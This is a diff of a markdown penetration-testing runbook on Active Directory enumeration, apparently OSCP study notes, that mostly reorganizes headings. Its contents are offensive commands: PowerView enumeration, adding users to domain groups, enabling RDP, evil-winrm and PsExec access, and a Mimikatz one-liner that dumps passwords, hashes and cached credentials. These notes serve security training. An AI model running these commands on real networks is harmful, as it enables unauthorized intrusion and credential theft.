@@ -1,4 +1,5 @@
-# OSCP Active Directory Enumeration
+# Active Directory Enumeration
+<!--- Status Complete --->
 
 ## Introduction
 
@@ -6,7 +7,7 @@ This runbook provides a comprehensive guide to Active Directory enumeration. It 
 
 ## Table of Contents
 
-- [OSCP Active Directory Enumeration](#oscp-active-directory-enumeration)
+- [Active Directory Enumeration](#active-directory-enumeration)
   - [Introduction](#introduction)
   - [Table of Contents](#table-of-contents)
   - [Enumeration](#enumeration)
@@ -19,12 +20,13 @@ This runbook provides a comprehensive guide to Active Directory enumeration. It 
     - [Add Domain User to a Domain Group](#add-domain-user-to-a-domain-group)
     - [Enumeration Script for All AD Users](#enumeration-script-for-all-ad-users)
     - [Access](#access)
-    - [Enumeration Through Service Principal Names](#enumeration-through-service-principal-names)
-  - [Enumeration - BloodHound](#enumeration---bloodhound)
+    - [Enumeration Through Service Powershell Scripts](#enumeration-through-service-powershell-scripts)
+    - [BloodHound](#bloodhound)
   - [Remote Access](#remote-access)
     - [Remote Desktop Protocol - RDP](#remote-desktop-protocol---rdp)
-      - [RDP from terminal](#rdp-from-terminal)
-      - [evil-winrm](#evil-winrm)
+    - [RDP from terminal](#rdp-from-terminal)
+    - [evil-winrm](#evil-winrm)
+    - [CLI administration](#cli-administration)
   - [Exploitation](#exploitation)
     - [Cached Credential Storage and Retrieval](#cached-credential-storage-and-retrieval)
     - [Extracting hashes](#extracting-hashes)
@@ -86,7 +88,7 @@ Get-NetLocalGroup -ComputerName <domain> -Recurse (PowerView)
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 ```
 
-### PowerView Module
+### [PowerView Module](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
 
  Configure ActiveDirectory Module - RSAT
 ```
@@ -96,31 +98,31 @@ Import-Module .\Microsoft.ActiveDirectory.Management.dll
 Import-Module .\ActiveDirectory.psd1  
 ```
 
-  Powerview
-
-[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
-
 ### Last Logon
 
-```sh
+```cmd
+# powerview
 Get-LastLoggedOn -ComputerName <domain>
 ```
 
 ### List Computers
 
-```sh
-Get-NetComputer (PowerView)
+```cmd
+# powerview
+Get-NetComputer 
 ```
 
 ### Add Domain User to a Domain Group
 
-```sh
+```cmd
+# powerview
 Add-DomainGroupMember -Identity 'SQLManagers' -Members 'examed'
 Get-NetGroupMember -GroupName 'SQLManagers'
 ```
 
 ### Enumeration Script for All AD Users
 
+<!--- Do I want to keep it?  -->
 ```powershell
 $domainObj = [System.DirectoryServices.ActiveDirectory.Domain::GetCurrentDomain()
 $PDC = ($domainObj.PdcRoleOwner).Name
@@ -168,11 +170,15 @@ smbmap -H <ip> -u <user>
 crackmapexec smb <IP> --shares -u <user> -p '<pass>'
 ```
 
-### Enumeration Through Service Principal Names
+### Enumeration Through Service Powershell Scripts
 
-[Get-SPN](https://github.com/compwiz32/PowerShell/blob/master/Get-SPN.ps1) - Powershell script
+Get Principal Names
+[Get-SPN](https://github.com/compwiz32/PowerShell/blob/master/Get-SPN.ps1)
 
-## Enumeration - BloodHound
+Get User Privileges
+[Get-Privileges](#https://github.com/compwiz32/PowerShell/blob/master/Get-Privileges.ps1)
+
+### BloodHound
 
 kali
 ```sh
@@ -210,12 +216,8 @@ net localgroup "Remote Desktop Users" <user> /add
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
 Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 ```
-  Move to another user  
-```cmd
-runas /user:<hostname>\<user> cmd
-```
 
-#### RDP from terminal
+### RDP from terminal
 
   xfreerdp via RDP with sharing in \\\tsclient\share\
 ```
@@ -226,10 +228,21 @@ xfreerdp /u:user /p:pass /v:ip +clipboard /dynamic-resolution /cert:ignore /driv
 rdesktop -u <user> -p <password> -d <domain> -f <ip>
 ```
 
-#### evil-winrm
+### evil-winrm
 
 ```
 evil-winrm -i <ip> -u <user> -p <password>
+```
+
+### CLI administration
+
+  Move to another user  
+```cmd
+runas /user:<hostname>\<user> cmd
+```
+  PSexec
+```cmd
+./PsExec64.exe -i \\<remote-ip> -u <domain\user> -p <password> cmd
 ```
 
 ## Exploitation
@@ -237,6 +250,7 @@ evil-winrm -i <ip> -u <user> -p <password>
 ### Cached Credential Storage and Retrieval
 
 See also password attacks
+  Mimikatz
 ```
 ./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"
 ```
